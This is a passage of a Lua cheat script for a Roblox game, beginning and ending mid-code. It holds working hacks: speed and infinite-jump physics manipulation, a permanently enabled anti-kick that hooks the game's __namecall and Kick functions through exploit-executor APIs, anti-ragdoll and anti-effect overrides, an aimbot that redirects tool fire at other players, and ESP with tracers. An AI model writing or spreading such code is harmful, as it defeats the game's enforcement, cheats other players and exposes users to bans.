_spd.rocketTarget.Parent = workspace _spd.rocket = Instance.new("RocketPropulsion") _spd.rocket.MaxThrust = 3000 _spd.rocket.MaxTorque = 1000 _spd.rocket.ThrustP = 100 _spd.rocket.ThrustD = 20 _spd.rocket.TurnP = 100 _spd.rocket.TurnD = 10 _spd.rocket.Target = _spd.rocketTarget _spd.rocket.Parent = hrp end _spd.rocketTarget.Position = targetPos pcall(function() _spd.rocket:Fire() end) end end 

function stopSpeedBoost()
	if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
	end
	pcall(destroySpeedObjects)
end

function startSpeedBoost()
	if not St.speedOn then
 stopSpeedBoost()
 return
	end
	currentSpeedValue = getActiveMoveSpeed()
	if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
	end
	-- EMPIRE full loop (RenderStepped)
	speedConnection = RS.RenderStepped:Connect(function(dt)
 if not St.speedOn then return end
 local char = LP.Character
 if not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 local hrp = char:FindFirstChild("HumanoidRootPart")
 if not hum or not hrp then return end
 -- ragdoll → stop
 local stt = hum:GetState()
 if stt == Enum.HumanoidStateType.Physics
 or stt == Enum.HumanoidStateType.Ragdoll
 or stt == Enum.HumanoidStateType.FallingDown
 or hum.Health <= 0 then
 _spd.lastMoveDir = Vector3.zero
 destroySpeedObjects()
 return
 end
 local md = hum.MoveDirection
 local spd = getActiveMoveSpeed()
 currentSpeedValue = spd
 local dir = Vector3.zero
 if md.Magnitude > 0.01 then
 _spd.lastMoveDir = md
 dir = md
 else
 -- giữ hướng khi anti ragdoll + phím còn giữ (Empire style)
 local anyHeld = false
 if type(MOVE_KEYS) == "table" then
 for key in pairs(MOVE_KEYS) do
 if UIS:IsKeyDown(key) then anyHeld = true break end
 end
 end
 if anyHeld and _spd.lastMoveDir and _spd.lastMoveDir.Magnitude > 0.01 then
 dir = _spd.lastMoveDir
 end
 end
 if dir.Magnitude > 0.01 then
 applySpeedMethod(hrp, hum, dir.Unit, spd, dt)
 else
 destroySpeedObjects()
 end
	end)
end

function setSpeedOn(on)
	St.speedOn = on and true or false
	if St.speedOn then startSpeedBoost() else stopSpeedBoost() end
	saveCfg()
end

function setActiveMode(mode)
	if not St.modes[mode] then return end
	St.activeMode = mode
	currentSpeedValue = getActiveMoveSpeed()
	if St.speedOn then
 startSpeedBoost() -- restart Empire loop
	end
	if _G.ZenonetopRefreshModeBar then pcall(_G.ZenonetopRefreshModeBar) end
	if _G.ZenonetopRefreshV2ModeBar then pcall(_G.ZenonetopRefreshV2ModeBar) end
	if _G.ZenonetopRefreshModeCards then pcall(_G.ZenonetopRefreshModeCards) end
	pcall(saveCfg)
end

----------------------------------------------------------------
-- INFINITE JUMP — FULL EMPIRE (hold + manual 2 mode)
----------------------------------------------------------------
InfJumpState = { enabled = false, mode = "hold", jumpHeld = false }
local _holdInfJumpConn = nil

function stopHoldInfJump()
	if _holdInfJumpConn then
 pcall(function() _holdInfJumpConn:Disconnect() end)
 _holdInfJumpConn = nil
	end
end

function startHoldInfJump()
	stopHoldInfJump()
	-- FULL Empire hold infinite jump (Velocity)
	_holdInfJumpConn = RS.Heartbeat:Connect(function()
 if not InfJumpState.enabled then return end
 local char = LP.Character
 if not char then return end
 local root = char:FindFirstChild("HumanoidRootPart")
 local hum = char:FindFirstChildOfClass("Humanoid")
 if not root or not hum then return end
 local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true) or (InfJumpState.jumpHeld == true)
 local vel = root.Velocity
 pcall(function()
 local av = root.AssemblyLinearVelocity
 if av then vel = av end
 end)
 if isJumpHeld and vel.Y < 35 then
 local nv = Vector3.new(vel.X, 55, vel.Z)
 pcall(function() root.Velocity = nv end)
 pcall(function() root.AssemblyLinearVelocity = nv end)
 end
 if vel.Y < -120 then
 local nv = Vector3.new(vel.X, -120, vel.Z)
 pcall(function() root.Velocity = nv end)
 pcall(function() root.AssemblyLinearVelocity = nv end)
 end
	end)
end

function startInfJump()
	InfJumpState.enabled = true
	InfJumpState.mode = St.infJumpMode or "hold"
	startHoldInfJump()
end

function stopInfJump()
	InfJumpState.enabled = false
	InfJumpState.jumpHeld = false
	stopHoldInfJump()
end

function setInfJump(on)
	St.infJump = on and true or false
	if St.infJump then startInfJump() else stopInfJump() end
	saveCfg()
end

function setInfJumpMode(mode)
	-- "hold" | "manual" — Empire dùng cùng loop; manual chỉ pulse jumpHeld
	St.infJumpMode = mode
	InfJumpState.mode = mode
	if St.infJump then startInfJump() end
	saveCfg()
end

-- Mobile JumpButton + Space (Empire)
if not _G._VisEmpireJumpHook then
	_G._VisEmpireJumpHook = true
	task.spawn(function()
 local pg = LP:WaitForChild("PlayerGui", 15)
 if not pg then return end
 local function hookJumpButton(btn)
 if btn:IsA("GuiButton") and btn.Name == "JumpButton" and not btn:GetAttribute("ZenonetopInfJumpHooked") then
 btn:SetAttribute("ZenonetopInfJumpHooked", true)
 btn.MouseButton1Down:Connect(function()
 if InfJumpState.enabled then InfJumpState.jumpHeld = true end
 end)
 btn.MouseButton1Up:Connect(function()
 InfJumpState.jumpHeld = false
 end)
 end
 end
 for _, d in ipairs(pg:GetDescendants()) do hookJumpButton(d) end
 pg.DescendantAdded:Connect(hookJumpButton)
	end)
	UIS.JumpRequest:Connect(function()
 if not InfJumpState.enabled then return end
 if InfJumpState.mode == "manual" then
 InfJumpState.jumpHeld = true
 task.defer(function() InfJumpState.jumpHeld = false end)
 end
	end)
	UIS.InputEnded:Connect(function(inp)
 if inp.KeyCode == Enum.KeyCode.Space then
 InfJumpState.jumpHeld = false
 end
	end)
end


-- ANTI KICK (Empire full) — LUÔN BẬT, không bao giờ OFF
----------------------------------------------------------------
local AntiKickState = { enabled = true, brainrotDetected = false, conn = nil }
function enableAntiKick()
	AntiKickState.enabled = true
	St.antiKick = true
	-- namecall Kick shield (executor)
	pcall(function()
 if hookmetamethod and not _G._FAGAntiKickHooked then
 _G._FAGAntiKickHooked = true
 local old
 old = hookmetamethod(game, "__namecall", function(self, ...)
 local method = (getnamecallmethod and getnamecallmethod()) or ""
 if tostring(method) == "Kick" then
 if self == LP or (typeof(self) == "Instance" and self:IsA("Player") and self == LP) then
 return -- block LocalPlayer:Kick
 end
 end
 return old(self, ...)
 end)
 end
	end)
	-- block Players.LocalPlayer:Kick via hookfunction if available
	pcall(function()
 if hookfunction and not _G._FAGKickFnHooked then
 _G._FAGKickFnHooked = true
 local oldKick = LP.Kick
 if typeof(oldKick) == "function" then
 hookfunction(oldKick, function(self, ...)
 return -- never kick self
 end)
 end
 end
	end)
	if AntiKickState.conn then return end
	AntiKickState.conn = task.spawn(function()
 while true do -- forever
 AntiKickState.enabled = true
 St.antiKick = true
 task.wait(0.5)
 local char = LP.Character
 local found = false
 if char then
 for _, tool in ipairs(char:GetChildren()) do
 if tool:IsA("Tool") then
 local n = tool.Name:lower()
 if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
 found = true
 break
 end
 end
 end
 end
 AntiKickState.brainrotDetected = found
 end
	end)
end
function disableAntiKick()
	-- KHÔNG BAO GIỜ TẮT — bỏ qua
	enableAntiKick()
end
function setAntiKick(on)
	enableAntiKick()
	saveCfg()
end
task.defer(enableAntiKick)



-- Anti Ragdoll V1=Splatter / V2=No Splatter (full Vynx logic)
AntiRagdollV2 = AntiRagdollV2 or { Connection = nil, Enabled = false, ResetCooldown = 0 }
St.antiRagdollMode = St.antiRagdollMode or "V1" -- V1=Splatter, V2=No Splatter

function forceNoSplatterReset()
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root or hum.Health <= 0 then return end
	pcall(function()
 hum:ChangeState(Enum.HumanoidStateType.GettingUp)
 root.Velocity = Vector3.zero
 root.RotVelocity = Vector3.zero
 root.AssemblyLinearVelocity = Vector3.zero
 root.AssemblyAngularVelocity = Vector3.zero
 for _, obj in ipairs(char:GetDescendants()) do
 if obj:IsA("Motor6D") then obj.Enabled = true end
 if obj:IsA("Constraint") then obj.Enabled = true end
 end
 workspace.CurrentCamera.CameraSubject = hum
 local PM = LP:FindFirstChild("PlayerScripts") and LP.PlayerScripts:FindFirstChild("PlayerModule")
 if PM then
 local ok, CM = pcall(function() return require(PM:FindFirstChild("ControlModule")) end)
 if ok and CM and CM.Enable then pcall(function() CM:Enable() end) end
 end
 hum.AutoRotate = true
 hum.PlatformStand = false
 hum.Sit = false
	end)
end

function startAntiRagdoll()
	stopAntiRagdoll()
	AntiRagdollV2.Enabled = true
	AntiRagdollV2.Connection = RS.Heartbeat:Connect(function()
 if not AntiRagdollV2.Enabled or not St.antiRagdoll then return end
 local char = LP.Character
 if not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 local root = char:FindFirstChild("HumanoidRootPart")
 if not hum or hum.Health <= 0 then return end
 local state = hum:GetState()
 local ragdolled = (state == Enum.HumanoidStateType.Physics
 or state == Enum.HumanoidStateType.Ragdoll
 or state == Enum.HumanoidStateType.FallingDown)
 local mode = tostring(St.antiRagdollMode or "V1"):upper()
 -- V2 = No Splatter (Vynx)
 if mode == "V2" or mode == "NO SPLATTER" then
 if ragdolled then
 local now = tick()
 if now - (AntiRagdollV2.ResetCooldown or 0) > 0.15 then
 AntiRagdollV2.ResetCooldown = now
 forceNoSplatterReset()
 end
 end
 return
 end
 -- V1 = Splatter (Vynx): clear constraints + Running
 if not root then return end
 local endTime = LP:GetAttribute("RagdollEndTime")
 if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
 ragdolled = true
 end
 if ragdolled then
 pcall(function()
 LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
 end)
 for _, d in ipairs(char:GetDescendants()) do
 if d:IsA("BallSocketConstraint") or
 (d:IsA("Attachment") and tostring(d.Name):find("RagdollAttachment")) then
 d:Destroy()
 end
 end
 for _, obj in ipairs(char:GetDescendants()) do
 if obj:IsA("Motor6D") and obj.Enabled == false then
 obj.Enabled = true
 end
 end
 if hum.Health > 0 then
 hum:ChangeState(Enum.HumanoidStateType.Running)
 end
 pcall(function() workspace.CurrentCamera.CameraSubject = hum end)
 root.Anchored = false
 root.AssemblyLinearVelocity = Vector3.zero
 root.AssemblyAngularVelocity = Vector3.zero
 end
	end)
end

function stopAntiRagdoll()
	AntiRagdollV2.Enabled = false
	if AntiRagdollV2.Connection then
 pcall(function() AntiRagdollV2.Connection:Disconnect() end)
 AntiRagdollV2.Connection = nil
	end
	AntiRagdollV2.ResetCooldown = 0
end

function setAntiRagdoll(on)
	St.antiRagdoll = on and true or false
	if St.antiRagdoll then
 startAntiRagdoll()
	else
 stopAntiRagdoll()
	end
	pcall(saveCfg)
end

function setAntiRagdollMode(mode)
	mode = tostring(mode or "V1"):upper()
	if mode == "V2" or mode == "NO SPLATTER" or mode == "NOSPLATTER" then
 St.antiRagdollMode = "V2"
	else
 St.antiRagdollMode = "V1"
	end
	if St.antiRagdoll then
 stopAntiRagdoll()
 startAntiRagdoll()
	end
	pcall(function() if _G.ZenonetopRefreshAntiRagMode then _G.ZenonetopRefreshAntiRagMode() end end)
	pcall(saveCfg)
end
_G.ZenonetopSetAntiRagdollMode = setAntiRagdollMode



----------------------------------------------------------------
-- ANTI GUMMY / BOOGIE / PAINTBALL (ZENONETOP full) — LUÔN BẬT
--------------------------------------------------------------
-- Anti Gummy / Boogie / Bee / Paintball (from Tp Heatseeker)
-- Always ON, no GUI
-- ============================================================
if not _G._FAG_VisAntiGummyFullLoaded then
	_G._FAG_VisAntiGummyFullLoaded = true
	task.spawn(function()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer

 local AntiGummy, AntiBoogie, AntiBee = true, true, false -- no Anti Bee
 local ANTI_PAINTBALL_ALWAYS_ON = true

 local function ResetTool(Char)
 if not Char then Char = LocalPlayer.Character end
 if not Char then return end
 pcall(function()
 LocalPlayer:SetAttribute("BlockTools", false)
 LocalPlayer:SetAttribute("Web", false)
 Char:SetAttribute("BackpackReady", true)
 end)
 end

 local function ClearEffect()
 if AntiBee then
 for _, V in pairs(Lighting:GetChildren()) do
 if V.Name == "BeeBlur" or V.Name == "Flashbang" then
 pcall(function() V:Destroy() end)
 end
 end
 local Ctrl = ReplicatedStorage:FindFirstChild("Controllers")
 if Ctrl then
 local BC = Ctrl:FindFirstChild("BeeLauncherController")
 if BC then
 local B = BC:FindFirstChild("Buzzing")
 if B then pcall(function() B:Stop() end) end
 end
 end
 end
 if AntiBoogie then
 for _, V in pairs(Lighting:GetChildren()) do
 if V.Name == "DiscoEffect" then
 pcall(function() V:Destroy() end)
 end
 end
 local Ctrl = ReplicatedStorage:FindFirstChild("Controllers")
 if Ctrl then
 local BC = Ctrl:FindFirstChild("BoogieBombController")
 if BC then
 local B = BC:FindFirstChild("BOOM")
 if B then pcall(function() B:Stop() end) end
 end
 end
 end
 end

 local function getMainHudGui()
 local pg = LocalPlayer:FindFirstChild("PlayerGui")
 return pg and pg:FindFirstChild("Main")
 end

 local function isPaintballSplatGui(gui)
 if not gui or gui.Parent ~= getMainHudGui() then return false end
 if not (gui:IsA("ImageLabel") or gui:IsA("ImageButton")) then return false end
 if gui:GetAttribute("__UGPaintballIgnore") or gui:GetAttribute("__UGPaintballShrunk") then return false end
 return math.abs(gui.Rotation) > 0.01
 end

 local function shrinkPaintballSplat(gui)
 if not gui or gui:GetAttribute("__UGPaintballShrunk") then return end
 gui:SetAttribute("__UGPaintballShrunk", true)
 gui.Size = UDim2.fromOffset(6, 6)
 end

 local function runAntiPaintballSweep()
 if not ANTI_PAINTBALL_ALWAYS_ON then return end
 task.spawn(function()
 for _ = 1, 8 do
 local main = getMainHudGui()
 if not main then break end
 for _, c in ipairs(main:GetChildren()) do
 if isPaintballSplatGui(c) then
 pcall(shrinkPaintballSplat, c)
 end
 end
 task.wait(0.05)
 end
 end)
 end

 -- Paintball continuous sweep
 task.spawn(function()
 while task.wait(0.25) do
 if ANTI_PAINTBALL_ALWAYS_ON then
 pcall(runAntiPaintballSweep)
 end
 end
 end)

 -- Heartbeat: Anti Gummy + Boogie/Bee
 RunService.Heartbeat:Connect(function()
 if AntiGummy then
 pcall(ResetTool)
 end
 if AntiBoogie or AntiBee then
 pcall(ClearEffect)
 end
 end)

 -- Also clear on Lighting child added (instant)
 pcall(function()
 Lighting.ChildAdded:Connect(function(child)
 if not child then return end
 local n = child.Name
 if AntiBee and (n == "BeeBlur" or n == "Flashbang") then
 task.defer(function() pcall(function() child:Destroy() end) end)
 end
 if AntiBoogie and n == "DiscoEffect" then
 task.defer(function() pcall(function() child:Destroy() end) end)
 end
 end)
 end)

 -- Paintball: shrink when new splat appears on Main HUD
 pcall(function()
 local function hookMain(main)
 if not main or main:GetAttribute("_VisAntiPaintballHooked") then return end
 main:SetAttribute("_VisAntiPaintballHooked", true)
 main.ChildAdded:Connect(function(c)
 task.defer(function()
 if isPaintballSplatGui(c) then
 pcall(shrinkPaintballSplat, c)
 end
 end)
 end)
 end
 local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 10)
 if pg then
 hookMain(pg:FindFirstChild("Main"))
 pg.ChildAdded:Connect(function(ch)
 if ch.Name == "Main" then
 task.defer(function() hookMain(ch) end)
 end
 end)
 end
 end)

 -- CharacterAdded: ensure tools unblocked
 LocalPlayer.CharacterAdded:Connect(function(char)
 task.defer(function()
 pcall(ResetTool, char)
 end)
 end)

 print("[Vis AllGear] Anti Gummy / Boogie / Bee / Paintball ON (silent)")
	end)
end

-- Setters: luôn ON, không OFF được
function setAntiGummy(on)
	St.antiGummy = true
	AntiFX.gummy = true
	saveCfg()
end
function setAntiBoogie(on)
	St.antiBoogie = true
	AntiFX.boogie = true
	saveCfg()
end
function setAntiPaint(on)
	St.antiPaint = true
	AntiFX.paint = true
	saveCfg()
end

----------------------------------------------------------------
-- TOOL AIMBOT (ZENONETOP full) — LUÔN BẬT
----------------------------------------------------------------
local aimOn = true
local TOOLS = { ["Web Slinger"] = true, ["Paintball Gun"] = true, ["Laser Cape"] = true }
local hooked = {}
local mouseMod, lastAimUp = nil, 0
function getMouse()
	if mouseMod then return mouseMod end
	pcall(function()
 local pkg = ReplicatedStorage:FindFirstChild("Packages")
 if pkg then mouseMod = require(pkg:WaitForChild("PlayerMouse", 5)) end
	end)
	return mouseMod
end
function bestEnemy()
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local cam = workspace.CurrentCamera
	if not root or not cam then return nil end
	local best, score = nil, math.huge
	local camPos, camDir = cam.CFrame.Position, cam.CFrame.LookVector
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then
 local r = plr.Character:FindFirstChild("HumanoidRootPart")
 local h = plr.Character:FindFirstChildOfClass("Humanoid")
 if r and h and h.Health > 0 then
 local d = (r.Position - root.Position).Magnitude
 if d <= 100 then
 local to = r.Position - camPos
 if to.Magnitude > 0.01 then
 local ang = math.deg(math.acos(math.clamp(camDir:Dot(to.Unit), -1, 1)))
 local sc = d + (ang > 200 and 1000 or 0)
 if sc < score then score, best = sc, r end
 end
 end
 end
 end
	end
	return best
end
function overrideMouse()
	if not aimOn then return end
	local pm = getMouse()
	if not pm then return end
	local e = bestEnemy()
	if e and e.Parent then
 local vel = e.AssemblyLinearVelocity or Vector3.zero
 pcall(function()
 pm.Hit = CFrame.new(e.Position + vel * 0.1)
 pm.Target = e
 end)
	end
end
function hookTool(tool)
	if hooked[tool] or not tool then return end
	hooked[tool] = true
	tool.Activated:Connect(overrideMouse)
	tool.Equipped:Connect(function()
 task.wait(0.1)
 local pm = getMouse()
 if pm and aimOn then
 local old = pm.Button1Down
 pm.Button1Down = function(...)
 overrideMouse()
 if old then old(...) end
 end
 end
	end)
end
function watchTools(parent)
	if not parent then return end
	for _, c in ipairs(parent:GetChildren()) do
 if TOOLS[c.Name] then hookTool(c) end
	end
	parent.ChildAdded:Connect(function(c)
 task.wait(0.05)
 if TOOLS[c.Name] then hookTool(c) end
	end)
end
watchTools(LP.Backpack)
if LP.Character then watchTools(LP.Character) end
LP.CharacterAdded:Connect(function(c)
	task.wait(0.2)
	watchTools(c)
	watchTools(LP.Backpack)
end)
RS.RenderStepped:Connect(function()
	if not aimOn then return end
	if tick() - lastAimUp > 0.1 then lastAimUp = tick(); bestEnemy() end
	if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then overrideMouse() end
end)
function setToolAim(on)
	-- LUÔN BẬT tool aimbot
	aimOn = true
	St.toolAim = true
	local char = LP.Character
	if char then pcall(watchTools, char) end
	local bp = LP:FindFirstChild("Backpack")
	if bp then pcall(watchTools, bp) end
	saveCfg()
end
-- boot tool aim
task.defer(function()
	aimOn = true
	St.toolAim = true
	pcall(function()
 if LP.Character then watchTools(LP.Character) end
 if LP.Backpack then watchTools(LP.Backpack) end
	end)
end)

----------------------------------------------------------------
-- DROP JUMP / STAND (Vis Clean)
----------------------------------------------------------------
local dropActive = false
local DROP_SPD, DROP_DUR = 200, 0.28
function runDrop()
	if dropActive then return end
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not root or not hum then return end
	local mode = tonumber(St.dropMode) or 2
	if mode == 1 then
 -- Stand / Fling style burst
 dropActive = true
 local t0 = tick()
 local conn
 conn = RS.Heartbeat:Connect(function()
 if not dropActive or tick() - t0 > 0.25 then
 if conn then conn:Disconnect() end
 dropActive = false
 if root and root.Parent then
 root.AssemblyLinearVelocity = Vector3.zero
 end
 return
 end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r then return end
 local v = Vector3.new(0, r.AssemblyLinearVelocity.Y, 0)
 r.AssemblyLinearVelocity = v * 10000 + Vector3.new(0, 10000, 0)
 end)
 return
	end
	-- Jump ascend
	dropActive = true
	local t0 = tick()
	local conn
	conn = RS.Heartbeat:Connect(function()
 local c = LP.Character
 local r = c and c:FindFirstChild("HumanoidRootPart")
 if not r or not dropActive then
 if conn then conn:Disconnect() end
 dropActive = false
 return
 end
 if tick() - t0 >= DROP_DUR then
 if conn then conn:Disconnect() end
 local rp = RaycastParams.new()
 rp.FilterDescendantsInstances = { c }
 rp.FilterType = Enum.RaycastFilterType.Exclude
 local rr = workspace:Raycast(r.Position, Vector3.new(0, -3000, 0), rp)
 if rr then
 local h2 = c:FindFirstChildOfClass("Humanoid")
 local off = ((h2 and h2.HipHeight) or 2) + (r.Size.Y / 2)
 r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z)
 end
 r.AssemblyLinearVelocity = Vector3.zero
 r.AssemblyAngularVelocity = Vector3.zero
 dropActive = false
 return
 end
 r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, DROP_SPD, r.AssemblyLinearVelocity.Z)
	end)
end

----------------------------------------------------------------
-- INSTA RESET V1 / V2 (Vis)
----------------------------------------------------------------
local _resetBusy = false
local _resetCD = false
local INST_V2_POS = CFrame.new(2000.5, 9911.9, 4000.2)
function InstaResetV2()
	if _resetBusy then return end
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hrp or not hum then return end
	_resetBusy = true
	local cam = workspace.CurrentCamera
	local lockCF = cam and cam.CFrame
	pcall(function()
 if cam then cam.CameraType = Enum.CameraType.Scriptable; cam.CFrame = lockCF end
 RS:BindToRenderStep("ZenonetopInstaV2Cam", Enum.RenderPriority.Camera.Value + 1, function()
 pcall(function()
 if cam then cam.CameraType = Enum.CameraType.Scriptable; if lockCF then cam.CFrame = lockCF end end
 local ac = LP.Character
 local ah = ac and ac:FindFirstChild("HumanoidRootPart")
 if ah then
 ah.AssemblyLinearVelocity = Vector3.zero
 ah.CFrame = INST_V2_POS
 end
 end)
 end)
	end)
	local conn
	conn = LP.CharacterAdded:Connect(function(newChar)
 if conn then conn:Disconnect() end
 pcall(function() RS:UnbindFromRenderStep("ZenonetopInstaV2Cam") end)
 local nh = newChar:WaitForChild("Humanoid", 5)
 task.wait(0.05)
 pcall(function()
 if cam and nh then cam.CameraSubject = nh; cam.CameraType = Enum.CameraType.Custom end
 end)
 _resetBusy = false
	end)
	task.delay(8, function()
 if _resetBusy then
 pcall(function() RS:UnbindFromRenderStep("ZenonetopInstaV2Cam") end)
 _resetBusy = false
 end
	end)
end

function InstaResetV1()
	-- V1: HipHeight kill — KHÔNG khóa camera, vẫn xoay ngang/dọc bình thường
	if _resetCD then return end
	local character = LP.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local hrp = character and character:FindFirstChild("HumanoidRootPart")
	if not character or not humanoid or not hrp then return end
	_resetCD = true
	_resetBusy = true
	local originalHip = humanoid.HipHeight
	local cam = workspace.CurrentCamera

	-- Giữ camera Custom — người chơi tự xoay, không Scriptable / không BindToRenderStep
	pcall(function()
 if cam then
 cam.CameraType = Enum.CameraType.Custom
 if humanoid then cam.CameraSubject = humanoid end
 end
 pcall(function() RS:UnbindFromRenderStep("ZenonetopInstaV1Cam") end)
 pcall(function() RS:UnbindFromRenderStep("ZenonetopInstaV2Cam") end)
	end)

	local charConn
	charConn = LP.CharacterAdded:Connect(function(newChar)
 if charConn then charConn:Disconnect() end
 local nh = newChar:WaitForChild("Humanoid", 5)
 task.wait(0.05)
 pcall(function()
 local c = workspace.CurrentCamera
 if c and nh then
 c.CameraSubject = nh
 c.CameraType = Enum.CameraType.Custom
 end
 end)
 _resetCD = false
 _resetBusy = false
	end)

	task.spawn(function()
 local attempts = 0
 while character and character.Parent and humanoid and attempts < 40 do
 if LP.Character ~= character then break end
 pcall(function()
 humanoid.PlatformStand = false
 humanoid.Sit = false
 pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end)
 pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Running) end)
 humanoid.HipHeight = 1e30
 humanoid.AutoRotate = true
 local rp = character:FindFirstChild("HumanoidRootPart")
 if rp then rp.CanCollide = false end
 for _, part in ipairs(character:GetChildren()) do
 if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
 part.CanCollide = false
 end
 end
 -- camera vẫn Custom mỗi frame (phòng script khác đổi)
 if cam then
 cam.CameraType = Enum.CameraType.Custom
 cam.CameraSubject = humanoid
 end
 end)
 if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then break end
 attempts = attempts + 1
 task.wait(0.05)
 end
 if character and character.Parent and humanoid and humanoid.Health > 0 then
 pcall(function() humanoid.Health = 0 end)
 end
 if character and character.Parent and humanoid then
 pcall(function()
 humanoid.HipHeight = originalHip
 local rp = character:FindFirstChild("HumanoidRootPart")
 if rp then rp.CanCollide = true end
 end)
 end
 task.delay(5, function()
 if _resetBusy then
 _resetCD = false
 _resetBusy = false
 end
 end)
	end)
end

function doInstaReset()
	if St.instaMode == "V2" then InstaResetV2() else InstaResetV1() end
end

----------------------------------------------------------------
-- TP DOWN (Vis)
----------------------------------------------------------------
function doTPDown(force)
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hrp or not hum or hum.Health <= 0 then return end
	if not force then
 if hum.FloorMaterial ~= Enum.Material.Air then return end
 if hrp.Position.Y < 20 then return end
	end
	hrp.CFrame = CFrame.new(hrp.Position.X, -7, hrp.Position.Z)
 * CFrame.Angles(0, select(2, hrp.CFrame:ToEulerAnglesYXZ()), 0)
	hrp.AssemblyLinearVelocity = Vector3.zero
end

----------------------------------------------------------------
-- ESP + TRACER + ANTI LAG
----------------------------------------------------------------
local ESP = { on = false, data = {}, conns = {} }
function espCleanup(plr)
	local d = ESP.data[plr]
	if not d then return end
	pcall(function() if d.hl then d.hl:Destroy() end end)
	pcall(function() if d.bb then d.bb:Destroy() end end)
	pcall(function() if d.tracer then d.tracer:Remove() end end)
	ESP.data[plr] = nil
end
function espSetup(plr, char)
	if not ESP.on or plr == LP or not char then return end
	espCleanup(plr)
	local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 3)
	local head = char:FindFirstChild("Head")
	if not hrp then return end
	local hl = Instance.new("Highlight")
	hl.Adornee = char
	hl.FillColor = Color3.fromRGB(35, 35, 35)
	hl.FillTransparency = 0.7
	hl.OutlineColor = Color3.fromRGB(255, 255, 255)
	hl.OutlineTransparency = 0
	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	hl.Parent = char
	local bb, tracer
	if head then
 bb = Instance.new("BillboardGui")
 bb.Adornee = head
 bb.Size = UDim2.new(0, 100, 0, 20)
 bb.StudsOffset = Vector3.new(0, 2.5, 0)
 bb.AlwaysOnTop = true
 bb.Parent = head
 local t = Instance.new("TextLabel", bb)
 t.Size = UDim2.new(1, 0, 1, 0)
 t.BackgroundTransparency = 1
 t.Text = plr.DisplayName or plr.Name
 t.TextColor3 = Color3.new(1, 1, 1)
 t.TextSize = 12
 t.Font = Enum.Font.GothamBold
 t.TextStrokeTransparency = 0.5
	end
	if St.tracer then
 tracer = Drawing and Drawing.new and Drawing.new("Line")
 if tracer then
 tracer.Thickness = 1
 tracer.Color = Color3.fromRGB(255, 255, 255)
 tracer.Visible = true
 end
	end
	ESP.data[plr] = { hl = hl, bb = bb, tracer = tracer, hrp = hrp }
end
function startESP()
	if ESP.on then return end
	ESP.on = true
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then espSetup(plr, plr.Character) end
 table.insert(ESP.conns, plr.CharacterAdded:Connect(function(c)
 task.defer(espSetup, plr, c)
 end))
	end
	table.insert(ESP.conns, Players.PlayerAdded:Connect(function(plr)
 table.insert(ESP.conns, plr.CharacterAdded:Connect(function(c)
 task.defer(espSetup, plr, c)
 end))
	end))
	table.insert(ESP.conns, RS.RenderStepped:Connect(function()
 if not St.tracer then return end
 local cam = workspace.CurrentCamera
 local my = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not cam or not my then return end
 local origin = cam:WorldToViewportPoint(my.Position)
 for plr, d in pairs(ESP.data) do
 if d.tracer and d.hrp and d.hrp.Parent then
 local p, onScreen = cam:WorldToViewportPoint(d.hrp.Position)
 d.tracer.From = Vector2.new(origin.X, origin.Y)
 d.tracer.To = Vector2.new(p.X, p.Y)
 d.tracer.Visible = onScreen and p.Z > 0
 elseif d.tracer then
 d.tracer.Visible = false
 end
 end
	end))
end
function stopESP()
	ESP.on = false
	for _, c in ipairs(ESP.conns) do pcall(function() c:Disconnect() end) end
	ESP.conns = {}
	for plr in pairs(ESP.data) do espCleanup(plr) end
end
function setESP(on)
	St.esp = on
	if on then startESP() else stopESP() end
	saveCfg()
end
function setTracer(on)
	St.tracer = on
	if St.esp then stopESP(); startESP() end
	saveCfg()
end

-- Anti Lag (Vis simplified)
local antiLagConn = nil
function applyDerender(obj)
	pcall(function()
 if obj:IsA("Accessory") or obj:IsA("Hat") then
 obj:Destroy()
 elseif obj:IsA("BasePart") then
 obj.Material = Enum.Material.Plastic
 obj.Reflectance = 0
 obj.CastShadow = false
 elseif obj:IsA("Decal") or obj:IsA("Texture") then
 obj.Transparency = 1
 elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
 or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
 obj.Enabled = false
 end
	end)
end
function setAntiLag(on)
	St.antiLag = on
	if on then
 Lighting.GlobalShadows = false
